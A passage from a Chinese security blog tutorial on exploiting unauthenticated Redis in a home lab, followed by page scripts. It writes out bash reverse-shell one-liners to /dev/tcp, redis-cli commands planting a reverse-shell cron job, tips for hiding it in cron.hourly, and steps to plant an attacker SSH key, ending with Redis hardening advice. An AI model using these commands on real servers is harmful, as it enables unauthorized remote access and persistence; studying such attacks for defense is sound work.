+<p>Ubuntu执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>​    此时成功反弹shell到nc</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531530323-6564fd8b-523f-46d9-bcd7-c074baeda827.png" alt="img"></p>
+<p>命令是没有问题的</p>
+<h3 id="（2）-var-spool-cron-用户名-测试"><a href="#（2）-var-spool-cron-用户名-测试" class="headerlink" title="（2）/var/spool/cron/用户名 测试"></a>（2）/var/spool/cron/用户名 测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.117:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/  //每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> haha <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  // 直接往当前用户的crontab里写入反弹shell，换行是必不可少的。每分钟尝试连接</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; get haha</span><br><span class="line"><span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  </span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532616785-1f47522e-0b64-4c8f-8768-798ad99d8977.png" alt="img"></p>
+<p>之所以会保存错误是因为当前用户对该文件夹没有写权限，为了实验效果修改再次保存即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532582590-7a51a137-3341-4dc5-a28c-35622c9d36c0.png" alt="img"></p>
+<p>这里也引起反思，实战中碰到这样的问题该怎么办？</p>
+<p>检验无错误</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533012313-aedd704a-2881-43a3-a36a-0564a0ba0e43.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532983058-cf53ff39-f824-40af-a114-9cfd4aa32c9c.png" alt="img"></p>
+<p>cron计划任务服务也已经开启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status cron</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534167034-3fe5ceed-8b96-43eb-b589-9527609f34b4.png" alt="img"></p>
+<p>但此时nc却迟迟未收到反弹shell</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533096098-b918280f-7837-40d6-aa1a-c7d7ee0760b6.png" alt="img"></p>
+<p>注意：有些系统对 crontab 的文件内容的校验比较严格可能会导致无法执行定时任务。</p>
+<p>按照一个前辈的说法就是Ubuntu的计划任务，前面有乱码它将无法执行。而如果换成CentOs就可以，因为CentOs可以跳过乱码，执行正确的能执行的计划任务代码。这里因为我未部署CentOs虚拟机，就当作我反弹成功了，后续有机会再补上CentOs</p>
+<p>一个师傅总结的一些定时计划目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/用户名</span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/xxx </span><br></pre></td></tr></table></figure>
+
+<p>​    看了上面才知道，原来当初设置数据库名字为root是对root用户，而这里我的用户名是xdd，因此重新设置一下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533697421-eb433a13-9485-4c56-9765-63505bfbc1c0.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533684356-a1429aaf-62e7-4618-b608-d359bfd07511.png" alt="img"></p>
+<p>nc依然没有收到shell，嗯！这样实验才有说服力，的确是Ubuntu的问题</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533741177-16cb4334-0fbe-4577-8d11-782d03a2637d.png" alt="img"></p>
+<h3 id="（3）开发不常用计划任务"><a href="#（3）开发不常用计划任务" class="headerlink" title="（3）开发不常用计划任务"></a>（3）开发不常用计划任务</h3><p>根据一个师傅的说法，如果尝试以上面这种方法写bash反弹，会导致<strong>覆盖原来有的crontab计划任务</strong>，因此极其不推荐直接写到/var/spool/cron，一旦运维在crontab中配置了一些脚本启动，盲目的覆盖，会对业务产生极大的破坏</p>
+<p>正确的做法是：选择一个开发不常用的计划任务</p>
+<p>以centos7为例子</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533897495-a3c1fda7-25ca-4ff0-811f-7c7975af01eb.png" alt="img"></p>
+<p>对应的含义如下：每天/每日/每小时/每月/每周</p>
+<p>可以写文件到/etc/cron.hourly/</p>
+<p>可以覆盖0anacron文件 or 创建一个可执行的sh文件</p>
+<p>覆盖0anacron，正常情况下，没人会在这里写计划任务，可以覆盖它：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533975584-749ba4a5-eca8-4ee5-88c7-3384487bdf16.png" alt="img"></p>
+<p>创建可执行sh文件，如下所示：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534034964-c9d1d86a-7bd8-40c5-81fc-d50bb65749fb.png" alt="img"></p>
+<p>这样就不会覆盖文件，比较保险</p>
+<h2 id="3、写SSH-key"><a href="#3、写SSH-key" class="headerlink" title="3、写SSH key"></a>3、写SSH key</h2><p>Linux 系统使用 ssh 的用户目录下都会有一个隐藏文件夹<code>/.ssh/</code>。比如我这里用户是</p>
+<p>只要把我们的公钥写在对方的 <code>.ssh/authorized_keys</code> 文件里再去用 ssh 连接就不需服务器的账号密码了</p>
+<p>开始实验！</p>
+<p>由于我Ubuntu的xdd用户目录下没有.ssh文件，那就自己创建一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535849507-85fa6746-3615-4ef4-9ad0-1db92522247b.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535875282-40eae062-5cf6-4a4e-89fc-8e4eee5e5474.png" alt="img"></p>
+<p>Kali的id_rsa.pub，这是Kali的公钥</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536756860-e59d965f-b838-4dc5-8092-ecc8c3c566c3.png" alt="img"></p>
+<p>将公钥信息写入到key.txt中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536881544-41f26278-d3dd-43f3-a787-f00d7c3a1311.png" alt="img"></p>
+<p>将xxx键的值设置为key.txt的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537347164-c16bbd0e-632a-44e6-a598-c4803d6d1a28.png" alt="img"></p>
+<p>将攻击者的公钥文件覆盖写入到用户的authorized_keys中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /home/xdd/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537508508-95f3f6e2-1f7c-4c42-aa69-2864ae884eed.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537491467-aef26890-cd79-49e1-8dd7-a50e9e9849ea.png" alt="img"></p>
+<p>如果本来就有authorized_keys文件，那么将会被新的覆盖</p>
+<p>​    此时用户那边有我们攻击者的公钥文件，攻击者就可以使用私钥免密ssh登录到用户的主机上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537871357-2968ef4e-bf32-40e0-bdb1-bd6a53717f1a.png" alt="img"></p>
+<h1 id="六、Redis基本安全策略"><a href="#六、Redis基本安全策略" class="headerlink" title="六、Redis基本安全策略"></a>六、Redis基本安全策略</h1><ol>
+<li><p>端口修改为其他端口（默认为6379）</p>
+</li>
+<li><p>requirepass设置复杂的密码</p>
+</li>
+<li><p>最好不要用Root用户去启动Redis，而是单独为Redis设置一个账号</p>
+</li>
+<li><p>设置本地localhost不允许外部访问，这样就不能让攻击者去爆破Redis的连接密码</p>
+</li>
+<li><p>开启保护模式protected-mode（默认开启）</p>
+</li>
+</ol>
+<h1 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1169/">https://paper.seebug.org/1169/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/piaomiaohongchen/p/15892170.html">https://www.cnblogs.com/piaomiaohongchen/p/15892170.html</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">w01ke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wolke.cn/post/472fbc5b.html">https://wolke.cn/post/472fbc5b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wolke.cn" target="_blank">wolke</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/Redis/">Redis</a></div><div class="post_share"><div class="social-share" data-image="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/redis-logo-lg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/5cb87fce.html"><img class="next-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/Microsoft-Excel.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Excel宏钓鱼</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ecd34c17.html" title="CSRF跨站请求伪造攻击"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180928160020BQS.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-31</div><div class="title">CSRF跨站请求伪造攻击</div></div></a></div><div><a href="/post/a645df71.html" title="PHP检查相等时的漏洞"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/5d84417ee7ad0520.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">PHP检查相等时的漏洞</div></div></a></div><div><a href="/post/98624e3.html" title="SSRF服务器端请求伪造攻击"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/2018092817354893l.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-07</div><div class="title">SSRF服务器端请求伪造攻击</div></div></a></div><div><a href="/post/ec694927.html" title="Web搭建安全拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079973928-8f4489b2-ca0e-4103-a1cf-6ae69e253f8d.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">Web搭建安全拓展</div></div></a></div><div><a href="/post/488cc6a6.html" title="Web数据包拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582307082-e666f24e-a7ac-4d99-b3df-abdaa21068c7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-03</div><div class="title">Web数据包拓展</div></div></a></div><div><a href="/post/de8a59bf.html" title="Web源码拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009190194-959ddb49-0e3e-4e9c-824e-8356fe945d9c.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">Web源码拓展</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81Redis%E4%BB%8B%E7%BB%8D"><span class="toc-text">一、Redis介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Ubuntu%E9%83%A8%E7%BD%B2Redis"><span class="toc-text">二、Ubuntu部署Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85"><span class="toc-text">1、下载和安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">2、修改配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%BF%90%E8%A1%8CRedis%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">3、运行Redis服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">4、客户端连接服务端</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81Kali%E5%AE%89%E8%A3%85Redis-cli"><span class="toc-text">三、Kali安装Redis-cli</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="toc-text">1、下载安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%8A%A0%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">2、加入环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%BF%9E%E6%8E%A5Ubuntu%E7%9A%84Redis%E6%9C%8D%E5%8A%A1"><span class="toc-text">3、连接Ubuntu的Redis服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-text">四、设置密码登录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81Redis%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">五、Redis写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%86%99%E5%85%A5Webshell"><span class="toc-text">1、写入Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%AF%E5%8A%A8%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">2、计划任务启动反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%91%BD%E4%BB%A4%E5%88%9D%E6%B5%8B%E8%AF%95"><span class="toc-text">（1）命令初测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89-var-spool-cron-%E7%94%A8%E6%88%B7%E5%90%8D-%E6%B5%8B%E8%AF%95"><span class="toc-text">（2）&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%BC%80%E5%8F%91%E4%B8%8D%E5%B8%B8%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">（3）开发不常用计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%86%99SSH-key"><span class="toc-text">3、写SSH key</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81Redis%E5%9F%BA%E6%9C%AC%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-text">六、Redis基本安全策略</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">七、参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By w01ke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1280658241'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1280658241%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/img/gongan.png"/><span>赣ICP备2021004623号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+      appKey: 'nQR603PJj8t2qUQiGTSeqXrB',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: {
+          "Heybox2": "Heybox/expression_cube_bingbujiandan.png",
+          "Heybox6": "Heybox/expression_cube_doge.png",
+          "Heybox7": "Heybox/expression_cube_gandong.png",
+          "Heybox8": "Heybox/expression_cube_guai.png",
+          "Heybox9": "Heybox/expression_cube_gugu.png",
+          "Heybox10": "Heybox/expression_cube_han.png",
+          "Heybox13": "Heybox/expression_cube_huaji.png",
+          "Heybox19": "Heybox/expression_cube_kuqi.png",
+          "Heybox20": "Heybox/expression_cube_nu.png",
+          "Heybox21": "Heybox/expression_cube_penshui.png",
+          "Heybox22": "Heybox/expression_cube_qiliang.png",
+          "Heybox23": "Heybox/expression_cube_shengqi.png",
+          "Heybox28": "Heybox/expression_cube_wa.png",
+          "Heybox29": "Heybox/expression_cube_weiqu.png",
+          "Heybox38": "Heybox/expression_heyboxgirl.png",
+          "Heybox41": "Heybox/expression_heygirl_aidao.png",
+          "Heybox42": "Heybox/expression_heygirl_baipiaoguai.png",
+          "Heybox43": "Heybox/expression_heygirl_chi.png",
+          "Heybox44": "Heybox/expression_heygirl_chigua.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox46": "Heybox/expression_heygirl_haha.png",
+          "Heybox47": "Heybox/expression_heygirl_haixiu.png",
+          "Heybox48": "Heybox/expression_heygirl_henaicha.png",
+          "Heybox49": "Heybox/expression_heygirl_huaji.png",
+          "Heybox50": "Heybox/expression_heygirl_jing.png",
+          "Heybox51": "Heybox/expression_heygirl_jixialai.png",
+          "Heybox52": "Heybox/expression_heygirl_kaikele.png",
+          "Heybox53": "Heybox/expression_heygirl_ku.png",
+          "Heybox54": "Heybox/expression_heygirl_kujiuruhou.png",
+          "Heybox55": "Heybox/expression_heygirl_nielian.png",
+          "Heybox56": "Heybox/expression_heygirl_qiaokaixin.png",
+          "Heybox58": "Heybox/expression_heygirl_rua.png",
+          "Heybox59": "Heybox/expression_heygirl_toukan.png",
+          "Heybox60": "Heybox/expression_heygirl_tu.png",
+          "Heybox61": "Heybox/expression_heygirl_wuyu.png",
+          "Heybox62": "Heybox/expression_heygirl_xihuan.png",
+          "Heybox63": "Heybox/expression_heygirl_yiwen.png",
+          "Heybox64": "Heybox/expression_heygirl_zhe.png",
+          "Heybox65": "Heybox/expression_heziji_1.png",
+          "Heybox66": "Heybox/expression_heziji_10.png",
+          "Heybox67": "Heybox/expression_heziji_11.png",
+          "Heybox68": "Heybox/expression_heziji_12.png",
+          "Heybox70": "Heybox/expression_heziji_14.png",
+          "Heybox71": "Heybox/expression_heziji_15.png",
+          "Heybox77": "Heybox/expression_heziji_20.png",
+          "Heybox78": "Heybox/expression_heziji_21.png",
+          "Heybox79": "Heybox/expression_heziji_22.png",
+          "Heybox80": "Heybox/expression_heziji_23.png",
+          "Heybox87": "Heybox/expression_heziji_3.png",
+          "Heybox88": "Heybox/expression_heziji_30.png",
+          "Heybox89": "Heybox/expression_heziji_31.png",
+          "HONKAI3-Daily1": "HONKAI3-Daily/1.gif",
+          "HONKAI3-Daily2": "HONKAI3-Daily/10.gif",
+          "HONKAI3-Daily3": "HONKAI3-Daily/11.gif",
+          "HONKAI3-Daily4": "HONKAI3-Daily/12.gif",
+          "HONKAI3-Daily5": "HONKAI3-Daily/13.gif",
+          "HONKAI3-Daily6": "HONKAI3-Daily/14.gif",
+          "HONKAI3-Daily7": "HONKAI3-Daily/15.gif",
+          "HONKAI3-Daily8": "HONKAI3-Daily/16.gif",
+          "HONKAI3-Daily9": "HONKAI3-Daily/2.gif",
+          "HONKAI3-Daily10": "HONKAI3-Daily/3.gif",
+          "HONKAI3-Daily11": "HONKAI3-Daily/4.gif",
+          "HONKAI3-Daily12": "HONKAI3-Daily/5.gif",
+          "HONKAI3-Daily13": "HONKAI3-Daily/6.gif",
+          "HONKAI3-Daily14": "HONKAI3-Daily/7.gif",
+          "HONKAI3-Daily15": "HONKAI3-Daily/8.gif",
+          "HONKAI3-Daily16": "HONKAI3-Daily/9.gif",
+          "HONKAI3-Star1": "HONKAI3-Star/1.gif",
+          "HONKAI3-Star2": "HONKAI3-Star/10.gif",
+          "HONKAI3-Star3": "HONKAI3-Star/11.gif",
+          "HONKAI3-Star4": "HONKAI3-Star/12.gif",
+          "HONKAI3-Star5": "HONKAI3-Star/13.gif",
+          "HONKAI3-Star6": "HONKAI3-Star/14.gif",
+          "HONKAI3-Star7": "HONKAI3-Star/15.gif",
+          "HONKAI3-Star8": "HONKAI3-Star/16.gif",
+          "HONKAI3-Star9": "HONKAI3-Star/2.gif",
+          "HONKAI3-Star10": "HONKAI3-Star/3.gif",
+          "HONKAI3-Star11": "HONKAI3-Star/4.gif",
+          "HONKAI3-Star12": "HONKAI3-Star/5.gif",
+          "HONKAI3-Star13": "HONKAI3-Star/6.gif",
+          "HONKAI3-Star14": "HONKAI3-Star/7.gif",
+          "HONKAI3-Star15": "HONKAI3-Star/8.gif",
+          "HONKAI3-Star16": "HONKAI3-Star/9.gif"
+      },
+      path: window.location.pathname,
+      placeholder: '',
+      pageSize: '',
+      lang: 'zh-CN',
+      recordIP: true,
+      emojiCDN: 'https://valinecdn.bili33.top/',
+      enableQQ: true,
+      tagMeta: ["UP","Buddy","Visitor"],
+      master: '1e45134c2d9e333e8889556513f09903',
+      friends: ['5029a42d22ca4d65e16cf3fdd9654ffe'],
+      requiredFields: ['nick','mail'],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
